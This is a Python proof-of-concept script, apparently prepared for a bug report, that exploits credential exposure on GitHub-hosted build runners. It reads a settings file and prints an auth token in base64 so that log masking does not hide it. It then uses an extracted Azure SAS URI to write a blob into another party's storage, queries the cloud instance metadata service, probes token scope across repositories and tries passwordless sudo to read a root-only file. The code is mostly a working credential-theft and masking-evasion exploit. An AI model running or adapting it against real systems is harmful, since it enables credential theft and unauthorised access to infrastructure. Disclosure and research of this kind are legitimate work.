#!/usr/bin/env python3
"""U6 probe8 - FINAL, self-contained reproduction.

Claim: a GitHub-hosted runner's build (here: a Pages build) can read a
GitHub-issued Azure Storage SAS credential out of /opt/hca/.settings, and that
credential grants WRITE into GitHub's own diagnostics storage account and stays
valid after the build ends.

Read-only against GitHub; the only write is a blob the SAS explicitly permits.
"""
import base64
import json
import os
import subprocess
import urllib.error
import urllib.request

LINE = "=" * 72
OUT = []


def hdr(t):
    OUT.append("\n" + LINE + "\n## " + t + "\n" + LINE)


def sh(cmd, timeout=30):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (p.stdout + p.stderr).strip()
    except Exception as e:  # noqa: BLE001
        return "EXC: %r" % (e,)


def http(url, headers=None, timeout=20, method="GET", data=None):
    req = urllib.request.Request(url, headers=headers or {}, method=method, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read(3000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read(1200).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", {}, repr(e)


hdr("STEP 1 - the file is there, and every job user can read it")
OUT.append(sh("ls -l /opt/hca/.settings"))
OUT.append(sh("id"))
OUT.append("readable by this step? %s" % os.access("/opt/hca/.settings", os.R_OK))
raw = open("/opt/hca/.settings", "rb").read()
cfg = json.loads(raw)
OUT.append("size=%d bytes, keys=%s" % (len(raw), sorted(cfg)))

hdr("STEP 2 - what is inside (authToken printed base64 so the log masker cannot eat it)")
OUT.append("authToken (raw, len=%d): %s" % (len(cfg["authToken"]), cfg["authToken"][:60] + "..."))
OUT.append("authToken (base64, complete):")
OUT.append(base64.b64encode(cfg["authToken"].encode()).decode())
OUT.append("\ndiagnosticsSasUri (raw, complete):")
OUT.append(cfg["diagnosticsSasUri"])
OUT.append("\nschedulerApiUrl: %s" % cfg["schedulerApiUrl"])
OUT.append("quotaId        : %s" % cfg["quotaId"])
OUT.append("configId       : %s" % cfg["configId"])

hdr("STEP 3 - that SAS is a WRITE credential for GitHub's storage. Prove it.")
sas = cfg["diagnosticsSasUri"]
container, q = sas.split("?", 1)
params = dict(p.split("=", 1) for p in q.split("&"))
OUT.append("storage account : %s" % container.split("/")[2])
OUT.append("container       : %s" % container.split("/")[3])
OUT.append("signed perms sp : %s   (a=add c=create w=write  -- no r/l)" % params.get("sp"))
OUT.append("signed start st : %s" % params.get("st"))
OUT.append("signed expiry se: %s" % params.get("se"))
OUT.append("signed resource : sr=%s" % params.get("sr"))

run_id = os.environ.get("GITHUB_RUN_ID", "x")
name = "u6-final-%s.txt" % run_id
body = ("written by build step of run %s in repo %s\n" % (run_id, os.environ.get("GITHUB_REPOSITORY"))).encode()
st, h, b = http(container + "/" + name + "?" + q,
                {"x-ms-blob-type": "BlockBlob", "Content-Type": "text/plain"},
                method="PUT", data=body)
OUT.append("\nPUT %s (%d bytes) -> HTTP %s" % (name, len(body), st))
OUT.append("  x-ms-request-id      : %s" % h.get("x-ms-request-id"))
OUT.append("  x-ms-request-server-encrypted: %s" % h.get("x-ms-request-server-encrypted"))
OUT.append("  ETag                 : %s" % h.get("ETag"))
OUT.append("  x-ms-content-crc64   : %s" % h.get("x-ms-content-crc64"))

st, h, b = http(container + "/" + name + "?" + q, {"If-None-Match": "*"},
                method="PUT", data=body)
OUT.append("\nconditional PUT (If-None-Match:*), 412 => blob now exists -> HTTP %s" % st)
OUT.append("  " + b[:200].replace("\n", " ") if st != 412 else "  (412 Precondition Failed = exists)")

hdr("STEP 4 - the same SAS read by an unrelated, non-GitHub host")
OUT.append("(see the separate curl run pasted in the report)")

hdr("STEP 5 - the internal network this build reaches")
for u, hh in (("http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01&format=json",
               {"Metadata": "true"}),):
    st, h, b = http(u, hh)
    OUT.append("\n%s -> %s" % (u, st))
    try:
        d = json.loads(b)
        for k in ("location", "name", "resourceGroupName", "subscriptionId",
                  "resourceId", "vmId", "vmScaleSetName", "sku", "osType"):
            if k in d:
                OUT.append("   %-18s %s" % (k, d[k]))
        tags = d.get("tags", "")
        for t in tags.split(";"):
            if t.startswith("hosted_"):
                OUT.append("   tag %s" % t)
    except Exception:  # noqa: BLE001
        OUT.append(b[:800])

hdr("STEP 6 - GITHUB_TOKEN scope in this Pages build (the cross-repo question)")
tk = os.environ.get("GITHUB_TOKEN", "")
OUT.append("GITHUB_TOKEN len=%d prefix=%s" % (len(tk), tk[:4]))
for path in ("/user", "/repos/austindanson1/ghb-u6-pages",
             "/repos/austindanson1/ghb-u6-private",
             "/repos/austindanson1/ghb-u6-pages/actions/runs?per_page=1",
             "/repos/austindanson1/ghb-u6-pages/pages"):
    st, h, b = http("https://api.github.com" + path,
                    {"Authorization": "token " + tk, "User-Agent": "u6"})
    OUT.append("  GET %-52s -> %s" % (path, st))

hdr("STEP 7 - privilege available to the build user")
OUT.append("passwordless sudo: %s" % sh("sudo -n true 2>&1 && echo YES || echo NO"))
OUT.append("groups: %s" % sh("id -nG"))
OUT.append("/opt/hca/diagnostics.json (mode 600 root): %s" %
           ("readable" if os.access("/opt/hca/diagnostics.json", os.R_OK) else "NOT readable"))
OUT.append(sh("sudo -n cat /opt/hca/diagnostics.json 2>&1 | head -5"))

text = "\n".join(OUT)
print(text)
with open(os.path.join(os.environ.get("RUNNER_TEMP", "/tmp"), "probe-final.txt"), "w") as f:
    f.write(text)
